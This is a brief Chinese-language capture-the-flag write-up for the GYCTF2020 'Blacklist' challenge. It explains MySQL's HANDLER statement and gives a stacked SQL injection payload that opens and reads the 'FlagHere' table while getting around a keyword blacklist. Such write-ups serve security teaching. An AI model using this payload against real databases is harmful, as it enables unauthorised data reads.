# [GYCTF2020]Blacklist

## 知识点

`堆叠注入`

`handler`

## 解题

需要用到HANDLER：

> 例如，**HANDLER tbl_name OPEN**打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
>
> 通过**HANDLER tbl_name READ FIRST**获取句柄的第一行，通过**READ NEXT**依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
>
> 通过**HANDLER tbl_name CLOSE**来关闭打开的句柄。

这道题照葫芦画瓢payload如下：

```sql
1'; handler `FlagHere` open as `a`; handler `a` read next;#
```

[参考](https://www.shawroot.cc/1115.html)